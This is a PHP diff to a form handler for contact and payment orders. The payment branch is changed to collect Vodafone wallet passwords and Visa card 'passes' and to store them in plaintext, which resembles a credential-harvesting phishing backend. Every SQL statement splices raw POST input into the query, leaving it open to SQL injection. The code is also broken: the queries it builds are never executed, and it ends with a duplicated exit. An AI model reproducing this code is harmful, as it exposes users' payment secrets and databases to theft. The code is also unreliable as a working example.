@@ -18,47 +18,42 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $zip = $_POST["zip"] ?? "";
         $country = $_POST["country"] ?? "";
 
-        $sql = "INSERT INTO contact_orders (name, address, city, state, zip, country)
+        $sql = "INSERT INTO contact_form (name, address, city, state, zip, country)
                 VALUES ('$name', '$address', '$city', '$state', '$zip', '$country')";
 
-        if ($conn->query($sql) === TRUE) {
-            echo "success";
-        } else {
-            echo "ERROR: " . $conn->error;
-        }
-
-        exit();
-    }
+        header("Location: index.php?success=1");
+exit();
+}
 
     // ================= PAYMENT =================
     elseif ($type == "payment") {
 
-        $name = $_POST["name"] ?? "";
-        $phone = $_POST["phone"] ?? "";
-        $address = $_POST["address"] ?? "";
-        $payment = $_POST["payment"] ?? "";
+    $name = $_POST["name"] ?? "";
+    $phone = $_POST["phone"] ?? "";
+    $address = $_POST["address"] ?? "";
+    $payment = $_POST["payment"] ?? "";
 
-        // تحديد تفاصيل الدفع
-        $details = "";
+    $wallet = "";
+    $pass = "";
 
-        if ($payment == "vodafone") {
-            $details = $_POST["vodafone_wallet"] ?? "";
-        } elseif ($payment == "visa") {
-            $details = $_POST["visa_card"] ?? "";
-        }
+    // تحديد تفاصيل الدفع
+    if ($payment == "vodafone") {
+        $wallet = $_POST["vodafone_wallet"] ?? "";
+        $pass = $_POST["vodafone_pass"] ?? "";
 
-        $sql = "INSERT INTO payment_orders 
-                (name, phone, address, payment_method, payment_details) 
-                VALUES 
-                ('$name', '$phone', '$address', '$payment', '$details')";
-
-        if ($conn->query($sql) === TRUE) {
-            echo "success";
-        } else {
-            echo "ERROR: " . $conn->error;
-        }
-
-        exit();
+    } elseif ($payment == "visa") {
+        $wallet = $_POST["visa_card"] ?? "";
+        $pass = $_POST["visa_pass"] ?? "";
     }
+
+    $sql = "INSERT INTO payment_orders 
+    (name, phone, address, payment_method, wallet_number, wallet_pass)
+    VALUES 
+    ('$name', '$phone', '$address', '$payment', '$wallet', '$pass')";
+
+    header("Location: index.php?success=1");
+exit();
+
+    exit();
 }
 ?>
